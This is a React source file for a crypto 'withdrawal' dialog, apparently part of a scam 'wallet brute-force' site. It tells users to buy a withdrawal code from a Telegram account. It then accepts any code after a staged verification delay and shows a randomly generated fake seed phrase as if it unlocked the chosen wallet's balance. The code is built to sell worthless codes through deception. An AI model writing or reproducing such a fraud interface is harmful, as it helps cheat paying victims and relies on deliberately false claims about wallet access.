import { Button } from "@/components/ui/button";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  ChevronRight,
  Copy,
  ExternalLink,
  KeyRound,
  Loader2,
} from "lucide-react";
import { useState } from "react";
import { CHAIN_CONFIG, ChainLogo } from "../lib/chains";

function getChainLogoId(ticker: string): string {
  const found = CHAIN_CONFIG.find((c) => c.ticker === ticker);
  return found?.id ?? ticker.toLowerCase();
}

function generateFakeSeedPhrase(): string {
  const words = [
    "abandon",
    "ability",
    "able",
    "about",
    "above",
    "absent",
    "absorb",
    "abstract",
    "absurd",
    "abuse",
    "access",
    "accident",
    "account",
    "accuse",
    "achieve",
    "acid",
    "acoustic",
    "acquire",
    "across",
    "action",
    "actor",
    "actual",
    "adapt",
    "adjust",
    "admit",
    "adult",
    "advance",
    "advice",
    "aerobic",
    "affair",
    "afford",
    "afraid",
    "again",
    "agent",
    "agree",
    "ahead",
    "alarm",
    "album",
    "alert",
    "alien",
    "alley",
    "allow",
    "almost",
    "alone",
    "alpha",
    "already",
    "alter",
    "always",
    "amateur",
    "amazing",
    "among",
    "amount",
    "amused",
    "analyst",
    "anchor",
    "ancient",
    "anger",
    "angle",
    "angry",
    "animal",
    "ankle",
    "announce",
    "antenna",
    "antique",
    "anxiety",
    "approve",
    "april",
    "arch",
    "arctic",
    "area",
    "arena",
    "argue",
    "arm",
    "armed",
    "armor",
    "army",
    "around",
    "arrange",
    "arrest",
    "arrive",
    "arrow",
    "artist",
    "aspect",
    "assault",
    "asset",
    "assist",
    "assume",
    "asthma",
    "athlete",
    "atom",
    "attack",
    "attend",
    "attitude",
    "attract",
    "auction",
    "audit",
    "august",
    "aunt",
    "author",
    "auto",
    "autumn",
    "average",
    "avocado",
    "avoid",
    "awake",
    "aware",
    "away",
    "awesome",
    "awful",
    "awkward",
  ];
  return Array.from(
    { length: 12 },
    () => words[Math.floor(Math.random() * words.length)],
  ).join(" ");
}

interface WalletItem {
  address: string;
  chain: string;
  balance: string;
}

interface WithdrawalModalProps {
  open: boolean;
  onClose: () => void;
  wallets?: WalletItem[];
  wallet?: WalletItem | null;
}

type Step = "wallet-select" | "enter-code" | "show-seed";

export function WithdrawalModal({
  open,
  onClose,
  wallets,
  wallet: singleWallet,
}: WithdrawalModalProps) {
  const [step, setStep] = useState<Step>(
    singleWallet ? "enter-code" : "wallet-select",
  );
  const [selectedWallet, setSelectedWallet] = useState<WalletItem | null>(
    singleWallet ?? null,
  );
  const [code, setCode] = useState("");
  const [verifying, setVerifying] = useState(false);
  const [seedPhrase] = useState(generateFakeSeedPhrase);
  const [copied, setCopied] = useState(false);

  const handleClose = () => {
    setStep(singleWallet ? "enter-code" : "wallet-select");
    setSelectedWallet(singleWallet ?? null);
    setCode("");
    setVerifying(false);
    setCopied(false);
    onClose();
  };

  const handleSelectWallet = (w: WalletItem) => {
    setSelectedWallet(w);
    setStep("enter-code");
  };

  const handleVerifyCode = () => {
    if (!code.trim()) return;
    setVerifying(true);
    setTimeout(() => {
      setVerifying(false);
      setStep("show-seed");
    }, 1500);
  };

  const handleCopy = () => {
    navigator.clipboard.writeText(seedPhrase);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const activeWallet = selectedWallet;

  const title =
    step === "wallet-select"
      ? "Select Wallet to Withdraw"
      : step === "enter-code"
        ? "Enter Withdrawal Code"
        : "Seed Phrase";

  return (
    <Dialog open={open} onOpenChange={handleClose}>
      <DialogContent
        className="max-w-lg w-[calc(100vw-2rem)] sm:w-full"
        data-ocid="withdraw.dialog"
      >
        <DialogHeader>
          <DialogTitle className="text-lg font-bold">{title}</DialogTitle>
          {activeWallet && step !== "wallet-select" && (
            <p className="text-sm text-muted-foreground font-mono mt-1 truncate">
              {activeWallet.chain} — {activeWallet.address}
            </p>
          )}
        </DialogHeader>

        {/* Step 1: Wallet Selection */}
        {step === "wallet-select" && wallets && (
          <div className="pt-2 max-h-[60vh] overflow-y-auto space-y-2">
            {wallets.length === 0 ? (
              <p className="text-sm text-muted-foreground py-4 text-center">
                No wallets available.
              </p>
            ) : (
              wallets.map((w, i) => (
                <button
                  key={`${w.address}-${i}`}
                  type="button"
                  onClick={() => handleSelectWallet(w)}
                  data-ocid={`withdraw.wallet_item.${i + 1}`}
                  className="w-full flex items-center gap-3 p-4 rounded-xl border border-border hover:border-foreground hover:bg-accent text-left transition-all group"
                >
                  <div className="flex-shrink-0">
                    <ChainLogo id={getChainLogoId(w.chain)} size={28} />
                  </div>
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center justify-between gap-2">
                      <span className="text-sm font-semibold text-foreground">
                        {w.chain}
                      </span>
                      <span className="text-sm font-bold text-foreground tabular-nums whitespace-nowrap">
                        {w.balance}
                      </span>
                    </div>
                    <p className="text-xs text-muted-foreground font-mono truncate mt-0.5">
                      {w.address}
                    </p>
                  </div>
                  <ChevronRight
                    size={16}
                    className="text-muted-foreground group-hover:text-foreground flex-shrink-0 transition-colors"
                  />
                </button>
              ))
            )}
          </div>
        )}

        {/* Step 2: Enter Code */}
        {step === "enter-code" && (
          <div className="pt-2 space-y-5">
            <div className="rounded-xl bg-muted/40 border border-border px-4 py-3">
              <p className="text-[10px] uppercase tracking-widest text-muted-foreground mb-1">
                Withdrawing Balance
              </p>
              <p className="text-xl font-bold text-foreground">
                {activeWallet?.balance}
              </p>
            </div>

            <div className="space-y-2">
              <Label htmlFor="withdraw-code" className="text-xs font-semibold">
                Withdrawal Code
              </Label>
              <Input
                id="withdraw-code"
                data-ocid="withdraw.code.input"
                placeholder="Enter your withdrawal code..."
                type="password"
                value={code}
                onChange={(e) => setCode(e.target.value)}
                onKeyDown={(e) => {
                  if (e.key === "Enter") handleVerifyCode();
                }}
                disabled={verifying}
                className="font-mono"
              />
            </div>

            <div className="rounded-xl border border-border px-4 py-3 space-y-2">
              <p className="text-xs text-muted-foreground leading-relaxed">
                Don&apos;t have a withdrawal code? Purchase one from:
              </p>
              <a
                href="https://t.me/brutecryptoadm"
                target="_blank"
                rel="noopener noreferrer"
                data-ocid="withdraw.code.telegram_link"
                className="inline-flex items-center gap-2 text-sm font-semibold text-foreground hover:opacity-70 transition-opacity"
              >
                <KeyRound size={14} />
                @brutecryptoadm on Telegram
                <ExternalLink size={11} className="text-muted-foreground" />
              </a>
            </div>

            <div className="flex gap-3">
              {wallets && (
                <Button
                  variant="outline"
                  onClick={() => setStep("wallet-select")}
                  disabled={verifying}
                  className="flex-1"
                  data-ocid="withdraw.back.button"
                >
                  Back
                </Button>
              )}
              <Button
                onClick={handleVerifyCode}
                disabled={!code.trim() || verifying}
                className="flex-1"
                data-ocid="withdraw.code.submit_button"
              >
                {verifying ? (
                  <>
                    <Loader2 size={14} className="mr-2 animate-spin" />{" "}
                    Verifying...
                  </>
                ) : (
                  "Continue"
                )}
              </Button>
            </div>
          </div>
        )}

        {/* Step 3: Show Seed Phrase */}
        {step === "show-seed" && (
          <div className="pt-2 space-y-5">
            <div className="rounded-xl bg-muted/40 border border-border px-4 py-3">
              <p className="text-[10px] uppercase tracking-widest text-muted-foreground mb-1">
                Wallet Seed Phrase
              </p>
              <p className="text-xs text-muted-foreground">
                {activeWallet?.chain} — {activeWallet?.address}
              </p>
            </div>

            <div
              className="rounded-xl border border-border p-4 bg-background"
              data-ocid="withdraw.seed.display"
            >
              <p className="font-mono text-sm text-foreground leading-relaxed tracking-wide select-all">
                {seedPhrase}
              </p>
            </div>

            <p className="text-[11px] text-muted-foreground leading-relaxed">
              Copy and store this seed phrase securely. Anyone with access to
              these words can access the wallet.
            </p>

            <div className="flex gap-3">
              <Button
                variant="outline"
                onClick={handleCopy}
                className="flex-1"
                data-ocid="withdraw.seed.copy_button"
              >
                <Copy size={14} className="mr-2" />
                {copied ? "Copied!" : "Copy Seed"}
              </Button>
              <Button
                onClick={handleClose}
                className="flex-1"
                data-ocid="withdraw.seed.done_button"
              >
                Done
              </Button>
            </div>
          </div>
        )}
      </DialogContent>
    </Dialog>
  );
}
